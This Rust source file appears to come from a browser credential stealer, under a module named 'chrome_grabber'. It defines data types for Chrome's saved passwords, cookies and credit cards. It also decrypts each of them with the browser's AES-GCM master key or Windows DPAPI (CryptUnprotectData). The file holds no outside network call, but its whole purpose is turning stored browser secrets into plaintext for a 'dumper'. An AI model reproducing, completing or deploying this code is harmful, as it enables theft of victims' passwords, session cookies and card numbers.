use crate::chrome_grabber::decryption_core::{aes_gcm_256, crypt_unprotect_data};
use crate::chrome_grabber::dumper::DumperError;
use rusqlite::Result;
use serde::*;
#[derive(Debug, Deserialize)]
pub struct LocalState<'a> {
    #[serde(borrow)]
    pub os_crypt: OsCrypt<'a>,
}

#[derive(Debug, Deserialize)]
pub struct OsCrypt<'a> {
    pub encrypted_key: &'a str,
}

#[derive(Debug, Clone)]
pub struct ChromeAccount {
    pub website: String,
    pub username_value: String,
    pub encrypted_pwd: Vec<u8>,
}

#[derive(Debug, Serialize, Clone)]
pub struct DecryptedAccount {
    pub website: String,
    pub username_value: String,
    pub pwd: String,
}

#[derive(Debug, Clone)]
pub struct ChromeCookie {
    pub hostkey: String,
    pub name: String,
    pub encrypted_cookie:  Vec<u8>,
    pub path: String,
    pub expire_utc: i64,
    pub secure: i64,
}

#[derive(Debug, Serialize, Clone)]
pub struct DecryptedCookie {
    pub hostkey: String,
    pub name: String,
    pub encrypted_cookie: String,
    pub path: String,
    pub expire_utc: i64,
    pub secure: i64,
}



#[derive(Debug, Clone)]
pub struct CreditCard {
    pub encrypted_number:  Vec<u8>,
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
}

#[derive(Debug, Serialize, Clone)]
pub struct DecryptedCreditCard {
    pub encrypted_number: String,
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
}




impl DecryptedAccount {
    pub fn from_chrome_acc(
        mut chrome_acc: ChromeAccount,
        master_key: Option<&mut [u8]>,
    ) -> Result<DecryptedAccount, DumperError> {
        match master_key {
            Some(master_key) => {
                let pwd_buf = chrome_acc.encrypted_pwd.as_slice();
                let pwd = aes_gcm_256(master_key, pwd_buf)?;
                Ok(DecryptedAccount {
                    website: chrome_acc.website,
                    username_value: chrome_acc.username_value,
                    pwd,
                })
            }
            None => {
                let pwd_buf = crypt_unprotect_data(chrome_acc.encrypted_pwd.as_mut_slice())?;
                let pwd = String::from_utf8(pwd_buf).map_err(|_| DumperError::FromUtf8Error)?;
                Ok(DecryptedAccount {
                    website: chrome_acc.website,
                    username_value: chrome_acc.username_value,
                    pwd,
                })
            }
        }
    }
}

impl ChromeAccount {
    pub fn new(website: String, username_value: String, password_value: Vec<u8>) -> Self {
        ChromeAccount {
            website,
            username_value,
            encrypted_pwd: password_value,
        }
    }
}


/*
     pub hostkey: String,
    pub name: String,
    pub encrypted_cookie:  Vec<u8>,
    pub path: String,
    pub expire_utc: i64,
    pub secure: i64,
*/
impl ChromeCookie {
    pub fn new(hostkey: String, name: String, encrypted_cookie: Vec<u8>, path: String, expire_utc: i64, secure: i64) -> Self {
        ChromeCookie {
            hostkey,
            name,
            encrypted_cookie,
            path,
            expire_utc,
            secure,
        }
    }
}


/*

#[derive(Debug, Clone)]
pub struct CreditCard {
    pub encrypted_number:  Vec<u8>,
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
}

#[derive(Debug, Serialize, Clone)]
pub struct DecryptedCreditCard {
    pub encrypted_number: String,
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
}
}

*/
impl CreditCard {
    pub fn new(encrypted_number: Vec<u8>, name_on_card: String, expiration_month: i64, expiration_year: i64) -> Self {
        CreditCard { encrypted_number: encrypted_number, name_on_card: name_on_card, expiration_month: expiration_month, expiration_year: expiration_year }
    }
}

impl DecryptedCreditCard {
    pub fn from_chrome_acc(
        mut chrome_acc: CreditCard,
        master_key: Option<&mut [u8]>,
    ) -> Result<DecryptedCreditCard, DumperError> {
        match master_key {
            Some(master_key) => {
                let pwd_buf = chrome_acc.encrypted_number.as_slice();
                let pwd = aes_gcm_256(master_key, pwd_buf)?;
                
                let cc = DecryptedCreditCard {
                    encrypted_number: pwd,
                    name_on_card: chrome_acc.name_on_card,
                    expiration_month: chrome_acc.expiration_month,
                    expiration_year: chrome_acc.expiration_year,
                };
                Ok(cc)

            }
            None => {
                let pwd_buf = crypt_unprotect_data(chrome_acc.encrypted_number.as_mut_slice())?;
                let pwd = String::from_utf8(pwd_buf).map_err(|_| DumperError::FromUtf8Error)?;
                let cc = DecryptedCreditCard {
                    encrypted_number: pwd,
                    name_on_card: chrome_acc.name_on_card,
                    expiration_month: chrome_acc.expiration_month,
                    expiration_year: chrome_acc.expiration_year,
                };
                Ok(cc)
            }
        }
    }
}


impl DecryptedCookie {
    pub fn from_chrome_acc(
        mut chrome_acc: ChromeCookie,
        master_key: Option<&mut [u8]>,
    ) -> Result<DecryptedCookie, DumperError> {
        match master_key {
            Some(master_key) => {
                let pwd_buf = chrome_acc.encrypted_cookie.as_slice();

                let pwd = aes_gcm_256(master_key, pwd_buf)?;
                Ok(DecryptedCookie {
                    hostkey: chrome_acc.hostkey,
                    name: chrome_acc.name,
                    encrypted_cookie: pwd,
                    path: chrome_acc.path,
                    expire_utc: chrome_acc.expire_utc,
                    secure: chrome_acc.secure,
                })
            }
            None => {
                let pwd_buf = crypt_unprotect_data(chrome_acc.encrypted_cookie.as_mut_slice())?;
                let pwd = String::from_utf8(pwd_buf).map_err(|_| DumperError::FromUtf8Error)?;
                Ok(DecryptedCookie {
                    hostkey: chrome_acc.hostkey,
                    name: chrome_acc.name,
                    encrypted_cookie: pwd,
                    path: chrome_acc.path,
                    expire_utc: chrome_acc.expire_utc,
                    secure: chrome_acc.secure,
                })
            }
        }
    }
}

impl From<std::io::Error> for DumperError {
    fn from(_: std::io::Error) -> Self {
        DumperError::IoError
    }
}